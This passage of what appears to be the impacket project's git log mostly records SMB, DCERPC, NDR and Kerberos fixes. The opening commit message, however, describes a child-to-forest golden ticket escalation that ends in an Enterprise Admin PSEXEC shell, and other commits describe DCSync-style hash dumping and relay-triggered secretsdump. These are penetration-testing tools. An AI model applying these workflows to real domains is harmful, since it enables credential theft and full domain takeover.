    by Benjamin Delpy (@gentilkiwi) in mimikatz (https://github.com/gentilkiwi/mimikatz).
    The idea of automating all these tasks came from @mubix.
    
    The workflow is as follows:
        Input:
            1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'i
               The domain specified MUST be the domain FQDN.
            2) Optionally a pathname to save the generated golden ticket (-w switch)
            3) Optionally a target to PSEXEC with Enterprise Admin privieleges to (-target-exec switch)
    
        Process:
            1) Find out where the child domain controller is located and get its info (via MS_NRPC)
            2) Find out what the forest FQDN is (via MS_NRPC)
            3) Get the forest's Enterprise Admin SID (via XXX)
            4) Get the child domain's krbtgt credentials (via MS_DRSR)
            5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
               and setting expiration 10 years from now
            6) Use the generated ticket to log into the forest and get the krbtgt/admin info
            7) If file was specified, save the golden ticket in ccache format
            8) If target was specified, a PSEXEC shell is launched
    
        Output:
            1) Forest's krbtgt/admin credentials
            2) A golden ticket saved in ccache for future fun and profit
            3) PSExec Shell with Enterprise Admin privileges at target-exec parameter.
    
    IMPORTANT NOTE: Your machine MUST be able to resolve all the domains from the child domain up to the
                    forest.

commit 81b92d4f3ce6308e45b5e40ab765575660a85cca
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 2 17:01:21 2015 -0300

    Adding some Kerberos crypto constants

commit fd455a6baf1378e50434a1e1a755e981bd0b6f5e
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 31 17:14:38 2015 -0300

    Keep asking TGS until we get the one we want.
    
    * This should only happen when jumping from one domain to another.

commit d7a7950d972cf9721c03796094af7b015e3fc77d
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 27 13:35:15 2015 -0300

    Adding -just-dc and -just-dc-ntlm options
    
    * -just-dc -> Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
    * -just-dc-ntlm -> Extract only NTDS.DIT data (NTLM hashes only)
    * Fixes https://github.com/CoreSecurity/impacket/issues/84
    * Also fixed a silly logic check that was preventing to parse NTDS.DIT files after we added DRSUAPI

commit 745e6d5f681c5060ba5b8c0cdc0d1b1cc4dc8ab2
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 27 10:47:09 2015 -0300

    DRSGetNCChanges only asks for the AD attributes we're interested in.
    
    * The attributes asked are:
     userPrincipalName(1.2.840.113556.1.4.656)
     sAMAccountName(1.2.840.113556.1.4.221)
     unicodePwd(1.2.840.113556.1.4.90)
     dBCSPwd(1.2.840.113556.1.4.55)
     ntPwdHistory(1.2.840.113556.1.4.94)
     lmPwdHistory(1.2.840.113556.1.4.160)
     supplementalCredentials(1.2.840.113556.1.4.125)
     objectSid(1.2.840.113556.1.4.146)
    * Lowers traffic generated
    * Helps minimizing parsing issues
    * Supposed to fix https://github.com/CoreSecurity/impacket/issues/83. Retest needed

commit e6ec7297eb4b4799a6e048222a7e27dc03a2d1fa
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 24 13:37:24 2015 -0300

    Added support for Windows 2003 DC
    
    * Turns out EXOP_REPL_SECRETS and in fact not supported in w2k3:
    <24> Section 4.1.10.1.3: The Replicate Single Object including Secret Data extended operation is supported by Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2.
    * Forgot to add DRS_WRIT_REP to the ulFlags.
    These two changes made the trick!
    * Tested against Win2k3/Win2k8r2/Win2k12R2
    
    Big thanks to @gentilkiwi for pointing out this wasn't working and help finding possible solutions (e.g. the ulFlags issue).

commit 7b78da36b986f0ff33f1f0c9a212870196144cfa
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 23 17:39:36 2015 -0300

    Cracking users using their SIDs instead of their name.
    
    Why? There could be problems when dealing with a forest with multiple subdomains in there
    and referencing the accounts by names.
    Thanks @gentilkiwi for pointing this out!
    I haven't been able to test it but this should solve the problem.

commit 8865ea30f247547d30465a5958225ac71074f085
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 19 11:34:13 2015 -0300

    Not processing machines' accounts for now.

commit 5aeb8ed5bf624c83327445e9265371d0aa111861
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 17 20:29:02 2015 -0300

    Restrict the amount of data to dump when an unpacking expection is printed.
    
    * Handy when we're unpacking a huge buffer. (i.e. DRSGetNCChanges())

commit e514994de1a841358c8ff707e1600e3f9fd7ad63
Author: asolino <bethus@gmail.com>
Date:   Sat Aug 15 18:30:33 2015 -0300

    Disabling parsing rgValues (PREPLVALINF_ARRAY).
    
    * It was reported unpacking errors with that field. Since we don't use it,
      and it's the last pointer, we can discard unpacking it, until we figure
      out what's going on.

commit 8dd7e36e922e1f049163abcbed295dcee25cc4e2
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 14 14:41:00 2015 -0300

    Inside smb3.logoff() we clear the stuff we used in case we want to authenticate again
    within the same connection

commit c8a8e442cb1e24af0eb1ed88ed97b0cd55118e64
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 14 13:01:55 2015 -0300

    Changed requested permission when opening users
    
    * Now we ask for samr.MAXIMUM_ALLOWED so we get more information
    back in the samr.USER_INFORMATION_CLASS.UserAllInformation structure.
    * Fixes https://github.com/CoreSecurity/impacket/issues/81

commit c22b3f6958e02252d4a71eaad308fe661bb7a6ea
Merge: 66901e7d 3dc9df20
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Aug 14 11:38:43 2015 -0300

    Merge pull request #80 from byt3bl33d3r/master
    
    fixed __init__() error in smbrelayx.py and added .gitignore

commit 3dc9df20a6083cd9ce4e701c6024508fed116f14
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Fri Aug 14 15:50:34 2015 +0200

    fixed __init__() error in smbrelayx.py and added .gitignore

commit 66901e7dd81c9a9ca602438a1e7bafcee707a74d
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 12 18:16:17 2015 -0300

    Adding support for CIM_ARRAY_STRING unpacking and...
    
    * Aiming at solving https://github.com/CoreSecurity/impacket/issues/79
    * ENCODED_STRING() now calculates the string length
    * Fix small typo with CIM_TYPE_ENUM.CIM_TYPE_UINT8 and CIM_TYPE_ENUM.CIM_TYPE_SINT8

commit b0294f3a1af46d307ba5c39d8da10dec384ceb33
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 11 15:30:30 2015 -0300

    Adding DRSVerifyName() test case

commit 008f3eafcd914ec97d8b7166af5ab15fbb4a29e8
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 11 15:27:11 2015 -0300

    Returning the string representation instead of the pyasn1 instance

commit 46448f9440a1ff68661737cccc8f2cadd648e113
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 10 20:02:24 2015 -0300

    Added 5.16.4 ATTRTYP-to-OID Conversion helper functions
    
    * EXOP_ERR.dump() now prints the hex number if no item is found

commit dbd7c993bf5fe9a681453c7f3abdd620d065f2ec
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 10 20:01:15 2015 -0300

    Initializing arrayPadding variable

commit 0f5f7ca3057a5b5bf8845f27b982fd7d5261b624
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 9 19:46:37 2015 -0300

    Change PAD patterns for debugging purposes

commit ec7688c3e14cdd96c8e0d125e092fe2f5917e04c
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 22:36:08 2015 -0300

    Unit tests now work if the target machine has many accounts available

commit 1bc241638d4d1a5b4a2abc00f9ca69b8df86f8c3
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 22:15:58 2015 -0300

    Removing unnecesary try: catch: clauses

commit 2f6911155e0a61744dc53dfd5627962db9af4b38
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 20:26:35 2015 -0300

    Adding EXOP_ERR Codes and adjusting DRS_MSG_GETCHGREPLY ulExtendedRet field
    
    * ulExtendedRet is now type EXOP_ERR so you can see the string result
    when you dump() the DRS_MSG_GETCHGREPLY union.

commit fb7e250d75c269ad1754bf5e52950bff5e9cdb64
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 20:11:12 2015 -0300

    Fixing hept_map() so it works in Windows 2003 AD
    
    Under Windows 2003 the Referent IDs cannot be random
    they must have specific values
    otherwise we get a rpc_x_bad_stub_data exception

commit e87b25f319553861d70c47a567565c38d5758bcd
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 17:19:09 2015 -0300

    Adding USER_SERVER_TRUST_ACCOUNT and USER_INTERDOMAIN_TRUST_ACCOUNT when listing target users

commit 116e8a5f457cf716fcfa2aa5e7786cdc52409575
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 17:06:34 2015 -0300

    Oops, forgot one comma!

commit 5abd32150fa2767543e6f5edc6a8b780052ce802
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 7 16:55:39 2015 -0300

    DRSUAPI support for NTLM hashes history and Kerberos keys (Sup. info)  added

commit 506431dc1ed8fc052616149eda43a9f8f1e7916d
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 4 22:52:47 2015 -0300

    OldPwdHashes, when empty, are '', not None

commit 12e6ca483473f1596554b82135db125d17684642
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 4 08:12:46 2015 -0300

    Fixing typos in methods and variables

commit d194b86e8ab58725d7583b7677e00b5f12905799
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 4 08:03:05 2015 -0300

    Setting alignment explicitly for this array until we fix it elsewhere

commit 7fb4fe2b8b9af6de42402f5b2a40406262f060c4
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 4 03:03:05 2015 -0300

    Fixed typo in variable name

commit e5af7102ee145ba6e0977c24e32c572335d1f127
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 4 02:45:16 2015 -0300

    Adding [MS-DRSR] DRSGetNCChanges approach to download users hashes
    
    * In a nutshell, we ask to replicate a single DSNAME instead of the whole NC.
    [MS-DRDS] "4.1.10.5 Server Behavior of the IDL_DRSGetNCChanges Method details"
    the steps you need to follow to be able to download a single DSNAME.
    Check also "4.1.10.5.12 ProcessFsmoRoleRequest"
    This approach works way faster than VSS and it's also a cleaner implementation.
    * Should work ok with pass-the-hash/ticket/keys
    * Pending history and Kerberos keys dump
    * Old VSS method is still available by using the -use-vss switch.
    
    A lot of testing needed!
    
    Kudos to Benjamin Delpy (@gentilkiwi) for publishing first his tool dsync which
    implements a similar approach (I think). Always rocking:
    https://github.com/gentilkiwi/kekeo/tree/master/dcsync

commit 455260e700e2469d66075849e87ee175b6d4517d
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 3 15:46:56 2015 -0300

    Adding get_session_key method to retrieve the session key from RPC runtime
    
    * This is used for example, by DRSUAPI to decrypt some secrets

commit d5cc2752da68228e24c16b7b0d52e26f77f6301a
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 3 09:41:47 2015 -0300

    Adding example for obtaining the target user's hash.

commit 5d1c29b91c191f629d2108caee75c98411ade44e
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 3 09:40:35 2015 -0300

    Adding the ability to decrypt secret attributes

commit b4677668a28bf604dc914adcd6412f2b87a28e5b
Merge: bec9abc7 cf97e9de
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Aug 2 17:21:42 2015 -0300

    Merge pull request #76 from Hexadite/raise_ioerror
    
    raise socket error instead of exception

commit bec9abc722afb9f071474e3a474f6490d8927700
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 2 17:17:53 2015 -0300

    No need to align before unpacking array referents
    
    The alignment check is performed later in the process

commit cf97e9deda89207c60bdf323c0a77e4419ee3932
Author: Omri Kantor <Omri@hexadite.com>
Date:   Sun Aug 2 10:49:24 2015 +0300

    Exception is to general, should catch socket.error and couple it with additional information.

commit bd54fbfaf9946496082dd9c9581e6ec168a2b81c
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 31 19:51:55 2015 -0300

    Fixed linked list issue with NDR in REPLENTINFLIST.
    
    * Minor changes and typos from the standard document
    * DRSGetNCChanges() finally working great!

commit b24c039d4d8e0a84c5b84b82e6ca54dc5ba38429
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 31 19:42:03 2015 -0300

    Adding lcd (local Change Directory) command
    
    * Wondering why it wasn't there before

commit 21a94333c69737099e7551f7a8ca4fa888ee5597
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 31 19:37:17 2015 -0300

    NDR performance improvements and alignment changes
    
    * Now we're counting the bytes we're advancing through the buffer at the same
      time we're unpacking data types, instead of packing the whole thing back to
      check its length. This should increase performance substantially, especially
      when dealing with big arrays of objects.
    * Fixed some alignment issues when dealing with arrays, especially with the
      size item that preceeds the array.
    Test cases are passing the same way before this commit. However we should
    test this a lot since screwing up with NDR alignment means an unpacking failure.
    Testing needed!

commit 8532e1ee7b28c58c308a5063f9f7792f42919264
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 29 21:32:34 2015 -0300

    Fixing some alignment issues in the NDR.
    
    * It was being triggered in high loaded arrays
    * There are still some issues pending to solve

commit 1fa4e23c0601edb61e28a50c1882e71c5c302688
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 27 20:53:04 2015 -0300

    Removing debug message

commit d724dd6bbf8d4ef46b924c284dc017109c8a662a
Merge: bdfc9d9a f181e6dc
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 25 12:25:01 2015 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit bdfc9d9ac994e1be84bed8b9379b858b4a8b74b6
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 25 12:23:16 2015 -0300

    [MS-DRSR] Directory Replication Service DRSUAPI Interface implementation
    
    - Just starting
    - Test cases added as well

commit dee68bc06e2839e2d6c820d6cc4ace6de95545c1
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 25 12:22:38 2015 -0300

    Adding ULARGE_INTEGER and PULARGE_INTEGER types

commit f181e6dc006f3f85bf5b971d51dbf70732e7200d
Author: 6e726d <6e726d@gmail.com>
Date:   Fri Jul 24 14:53:48 2015 -0300

    Extended present flags support on RadioTap class.
    
    - test_RadioTap.py PEP8 compliant.
    - Modified dot11.py to add support for extended present flags on the
    RadioTap class.
    - Added Radiotap extended present flags tests on test_RadioTap.py.

commit 67ff4f5ae3d5b60fc133d98c34e8523109809c7d
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 23 12:26:50 2015 -0300

    Don't call finish() when there are no instances created.

commit 2d189d58cc0aef1521d13bb4af8be16160ff0a6e
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 23 12:20:14 2015 -0300

    Cleaning up RemoteOperations() activities as well when job's done.

commit 322a3fdc2e4ad37098ce09a27d1a6cc11baa3e93
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 23 12:11:46 2015 -0300

    Dumping target's host hashes if -E switch not specified (only admin).
    
    Be sure secretsdump.py is present in the same directory as smbrelayx.py
    (default if the library is installed using `python setup.py install`).
    Have in mind you can put any code you want in the `doAttack.run()` method.

commit ebcbd20aefb6cab3f9e4afe333cee8e04b7485e6
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 20 09:45:43 2015 -0300

    Added extra check when parsing FIND_FIRST2 responses
    
    - Samba 3.6.9 doesn't set record['NextEntryOffset'] to 0 for the last
    record. Don't know exactly why, 'cause [MS-CIFS] clearly states that:
    
    `NextEntryOffset: (4 bytes): This field contains the offset, in bytes, from this entry in the list to the next entry in the list. If there are no additional entries, the value MUST be zero (0x00000000).`
    
    Now we're checking we reached the end of the buffer, just in case.

commit 5adde556af86317cf8c80a33446fb27ef69ed9ff
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 16 19:38:54 2015 -0300

    Commands are now executed using ITaskSchedulerService interface
    
    * We were previously using ATSVC Interface
    * It now should work with Windows 2012 R2, fixing https://github.com/CoreSecurity/impacket/issues/70. We should test older Windows versions.

commit 3c78caaaf86dd4739e0a18ea6961c7c8c4340da3
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 16 18:59:20 2015 -0300

    Adding hSchRpcRegisterTask helper function
    
    - Fix the definition of PTASK_XML_ERROR_INFO

commit c2f3ca55d7436ddd2c9dfadbf11bf3e067fada04
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 15 19:30:48 2015 -0300

    Upgraded to DCERPC.v5 runtime and Kerberos support added.
    
    Still does not solve https://github.com/CoreSecurity/impacket/issues/70 tho.
    Most probably the atsvc interface is deprectated in Windows 2012 R2.
    We have to try now using ITaskSchedulerService.

commit 5f2ffd3ad6ed96242c4ee57403c7cc3607ec7964
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 15 19:29:48 2015 -0300

    [MS-TSCH] ITaskSchedulerService Interface implementation and test cases.

commit 271f1dc3945724eb992cb74452bb019b3ac2bf3b
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 15 19:29:07 2015 -0300

    Adding [MS-DTYP] 2.3.13 SYSTEMTIME

commit 41c1dcd7c0ec7808ef249c3f31b7e2bde5e7ace5
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 15 19:28:41 2015 -0300

    Minor cosmetic changes

commit 6203d3fa1fc532b12c7409594c35b48d088bb85c
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 9 18:29:24 2015 -0300

    [MS-TSCH] SASec Interface implementation and test cases.
    
    ITaskSchedulerService left.

commit 3e1f7707677a95098c4e6426d726f2f8b98ed496
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 9 17:17:35 2015 -0300

    [MS-TSCH] ATSVC Interface implementation and test cases.
    
    For now just the ATSVC, now going for SASEC

commit 292621b1e807d3395021d88d66faac708fb3b4d8
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 9 16:37:03 2015 -0300

    Capturing output from stderr as well.
    
    Applying patch from @sshock described in https://github.com/CoreSecurity/impacket/issues/73

commit 7ac7b28bff5865c47ea833812b9dbd6a65c2c3a4
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 30 15:30:58 2015 -0300

    Using self.get_target for DCOM StringBinding calculation.
    
    If we specify a FQDN as the target when initiating a DCOMConnection,
    we replace the aNetworkAddr with self.get_target(). This is to help resolving the target system name.

commit ee53b2a39052d79c2812f9712badb0eca452b348
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 26 14:19:16 2015 -0300

    Adding LOG.debug message for the string binding chosen

commit 04518d7ae183af04b65719ec5d5ab60f4ac5635b
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 26 14:15:18 2015 -0300

    Improved DCOM StringBinding calculation
    
    1) When we need to connect to an interface, a list of possible string bindings are sent. Now we're trying to match self.get_target() as much as possible.
    (e.g. self.get_target() is IPv6, then we'll try to get an IPv6 binding, etc)
    2) DCOMConnection.disconnect() now clears the INTERFACE.CONNECTION dictionary
    3) Minor cosmetic changes

commit 6e9024f6b165754b7d31cba27a4e3aa8fedb55e5
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 26 11:49:20 2015 -0300

    Missed break would loop forever when passing a ticket for TDS auth

commit 8c094b79987401a850a03e9999753bc283dccae9
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 25 09:50:19 2015 -0300

    Adding eXecute permissions to the scripts, fixing https://github.com/CoreSecurity/impacket/issues/71

commit 5befbacb4f89fc1539b1fc9c4302ff777c26c770
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 24 18:02:34 2015 -0300

    Adding ULONG_PTR and DWORD_PTR data types

commit 6dfc966bf694e9ec80fab0a23ac01e150ff63b91
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 24 18:01:48 2015 -0300

    Adding debug message when fallbacking to RC4

commit 6ff37c74c975b6940a2dd81d8a57143c39b9fff2
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 24 18:01:07 2015 -0300

    Catching exceptions when login in.

commit b28a55bc4d65fc4da24701b13984ccf008c7b6ab
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 24 17:29:25 2015 -0300

    Adding Kerberos support to TDS (MSSQL)
    
    - Pass the hash/ticket/key support
    - mssqlclient.py: added -k, -aesKey flags

commit e66337e99e9668086b90039df5140b9439625249
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 16 18:55:16 2015 -0300

    Fixes queryFileInformation() bug for SMBServer (SMBv1)

commit 148c0debcc33ce2888b96d5049bb0a998cacc400
Merge: 8a1239fd 7d2dbe50
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 16 16:46:30 2015 -0300

    Merge branch 'rdubourguais-master'
    
    Adding 'Flags management inside SMBv1 stack' and in particular allowing to have UNICODE support for SMBv1
    Thanks @rdubourguais!

commit 7d2dbe5044daa595a8067d002e7cf9f961968aaf
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 16 16:35:59 2015 -0300

    Fixing code for failed test cases for SMBv1
    
    1) test_smb.py: flags2 MUST include smb.SMB.FLAGS2_LONG_NAMES otherwise FIND_FIRST fails
    2) smb.py: check_dir(), remove() and rename() weren't having UNICODE support. Added.
    3) Replacing tabs for spaces

commit b6ea954cc3c9473b6c4100b9a63696903435bf37
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 14:45:35 2015 +0200

    bug fix: check version length before setting __server_os_* in smb.py

commit 7319e5fef6733c3a5f1277e01ba6aa45e58f4324
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 11:20:54 2015 +0200

    Will be managed during negotiation.

commit 2b0b994fddf825941f37391f14d756013dd73816
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 11:18:58 2015 +0200

    Remove duplicate code.

commit 57b119454ed604c2024db4143c1dabbf569721cd
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 11:16:27 2015 +0200

    small bug fix.

commit 328caf150446658ec2621e7a2cd28e6c39cc8da0
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 10:49:24 2015 +0200

    Improve SMB header's flags management and code refactoring

commit cd1d22f392d881b7a4917d16b0fdddf5583bd03e
Merge: cc96628d 8a1239fd
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Tue Jun 16 09:48:25 2015 +0200

    Merge remote-tracking branch 'upstream/master'

commit 8a1239fd8b7c123e2e743a33cfab3d1107b2b0e0
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 15 20:22:34 2015 -0300

    Adding a new test suite for Unicode Support on SMB1
    
    Feature still not there but the idea is to implement it using manualNegotiate
    and setting the appropiate flags using SMBConnection.negotiateSession().
    Check https://github.com/CoreSecurity/impacket/issues/51 for details.

commit cc96628d0d94d230d67cbfbffc8f965ad44cccfc
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Mon Jun 15 19:37:20 2015 +0200

    Start unicode integration using self.__flags1 and self.__flags2.
    Removing talk* approach.

commit a345fc1c8c94499a455cf59b2c9b757a41aec60d
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Mon Jun 15 10:35:05 2015 +0200

    Bad attribute name fix.

commit 292960fe97a824ef76322eb6a54cc2083755f9c2
Merge: e3fe436c 6bb86b28
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Mon Jun 15 10:30:49 2015 +0200

    merge master upstream.

commit 6bb86b28bba6ce2f0adc3a5e6d6398b48628a93d
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 14 17:47:08 2015 -0300

    Adding @rdubourguais getServer* methods
    
    1) SMBConnection: getServerOSMajor(), getServerOSMinor(), getServerOSBuild()
    2) smb.py and smb3.py related methods to support 1)

commit 675310a11bc3461676afbdc0e21e6d1e57d46dcc
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 14 17:18:20 2015 -0300

    Renaming method's parameter name
    
    data -> negoData

commit ed1d4792c34b1b317426fa013264a808c37fb93a
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 14 16:53:53 2015 -0300

    Detaching protocol version negotiation from SMBConnection constructor
    
    1) You must specify manualNegotiate = True when creating an SMBConnection
    2) Then call SMBConnection.negotiateSession() where you can specify dialect,
    flags and data.
    3) By default everything works the same.

commit 0632c8c48f074380b821202207d28bb52607c6d2
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 14 16:14:33 2015 -0300

    Log the AbstractSyntax when DCERPC Bind request fails

commit 695cbf7049a86e18744e946bac2f701e440c78c4
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 14 16:09:36 2015 -0300

    Porting remaining commands to Structure
    
    1) Added SMB_COM_CHECK_DIRECTORY structure
    2) check_dir(), remove(), rmdir() ported
    3) Removed unused __send_smb_packet()

commit e3fe436cc21b5921a130b088eea4e65d8d2cb0c9
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Fri Jun 12 20:55:07 2015 +0200

    small bug fix.

commit 60abf05d0e83478e14489712bc7949fefa92a8c4
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Fri Jun 12 20:42:53 2015 +0200

    bug fix (calling the wrong function)

commit efa78d6a616619c583aba9ee48c9dacaf39d96b1
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Fri Jun 12 20:35:49 2015 +0200

    adding isTalkingUnicode to smbconnection.py

commit e2512b9e96841a9bcdfc9089e3b528557a35416f
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Fri Jun 12 20:25:34 2015 +0200

    Allowing smbconnection to get the unicode configuration.

commit 25214231b1de8ab1fce6aff2b01cf754f0c05375
Author: rdubourguais <renaud.dubourguais@synacktiv.com>
Date:   Fri Jun 12 20:00:43 2015 +0200

    Start unicode integration inside SMBv1 stack.

commit e12685ebbdc69c67b0012277f44be4a71eb31b0f
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 11 19:53:31 2015 -0300

    Replacing tab for spaces

commit 299bb6a4d2b74dfd7e1acdb801561b9d9dc158ed
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 11 14:55:03 2015 -0300

    Merging patch by Renaud Dubourguais exposing SMBConnection.isSigningRequired()
    
    The meaning of it is self explanatory ;)

commit 16d5162795dd6cc2a1dfea37a6fc42c395524c0f
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 18:11:20 2015 -0300

    Adjusting test cases for success against a w2k8 DC

commit 457eee71facde00d311af8f6d762f2be969e27fb
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 18:09:58 2015 -0300

    Adjusting test cases for success against a w2k8 DC

commit 270aadd40132fb06b46a339332e590ab9f6f6198
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 17:57:42 2015 -0300

    Code cleanup and improvements
    
    Removed:
    * SMBPacket class
    * recv_packet(): not used anymore, replaced for recvSMB()
    * __raw_retr_file(): (SMB_COM_READ_ANDX should be used)
    * __raw_stor_file(): (SMB_COM_WRITE_ANDX should be used)
    * list_shared(): we list shares through DCERPC, not using the LANMAN approach anymore
    * copy(): not used inside the library
    
    Changed:
    * trans2() renamed to send_trans2()
    * send_trans2() ported to Structure, and proper reassembly in place
    * query_file_info() now uses send_trans2()
    * list_path() rewritten to use Structure, much easier to read.
    * all instances of recv_packet() changed to recvSMB()

commit 91113242b3f79f0399bfbae9a913d265319e28ca
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 17:55:49 2015 -0300

    A better way to test whether the target file is a directory
    
    And also works against an OSX Yosemite SMB Server

commit 8f3592c561452c7b60cf29cc0e8acf9a46cab455
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 17:52:29 2015 -0300

    Adding support for connecting to an OSX Yosemite SMB share.
    
    Yosemite's SMB implementation would complain if the following flags are not
    part of the protocol negotiation:
    FLAGS2_NT_STATUS
    FLAGS2_LONG_NAMES
    FLAGS2_UNICODE
    
    If the first nego packet does not have that, the connection is closed.
    We don't really want to announce UNICODE support for all servers (especially
    against a NT4/SMB1 server), so we're changing these flags only if the
    former flags were rejected.

commit c1e6887b0bebf4aa02c56f48896dbdab5e7939a2
Author: asolino <bethus@gmail.com>
Date:   Tue Jun 9 17:44:32 2015 -0300

    Setting the minimum privileges to remove a file and directory
    
    Previous setting was broader, and was having issues against a OSX Server

commit a28d3d01921a58191d12e37a21fc0a66e696df63
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 7 23:00:13 2015 -0300

    Catching DCERPCException instead of Exception
    
    More realistic since we're then calling get_packet()

commit 0d9f1cec5c8c83377672fd9d1692a625a653c15c
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 7 22:42:07 2015 -0300

    Unifying DCERPC exceptions to impacket.dcerpc.v5.rpcrt.DCERPCException
    
    You should catch that one for all DCERPC related requests.

commit faac79a54ecd30c1d5804be3ebf2562713f255dc
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 7 20:34:25 2015 -0300

    Adding support for answering DCERPC NetrWkstaGetInfo calls
    
    Why? If you have a SMB Server and, at a client Windows, you execute
    `start \\host` from cmd.exe,  what happens is the client Windows
    not only connects to the SMB Server but also calls, via ncacn_np,
    the WKST DCERPC server NetrWkstaGetInfo function.
    
    If no WKST server is present no Windows Explorer window will pop up.
    
    Currently that's the only call supported, so some testing is
    needing to be sure it doesn't break cases where other calls are
    done (maybe OSX clients).

commit fb439fa9d06690a8f7a79b32429d9b84fae53ffc
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 7 20:31:25 2015 -0300

    Fixes DCERPC Server when a bind to an unknown UUID is requested.
    
    If we have a DCERPC Server bound to an specific UUID and a client
    requests binding to a different UUID (not registered) the server
    was launching an exception due to 'SecondaryAddrLen' not set.

commit 1418dd11c3eb09eca6b90a5680fe71840275a0f3
Author: asolino <bethus@gmail.com>
Date:   Sun Jun 7 20:28:58 2015 -0300

    Fix in SMBTreeConnectAndX_Data to support Samba's smbclient4
    
    Samba's smbclient4 behaves weird when connecting to a tree
    It specifies password len to be 0 when there's actually one NULL byte.
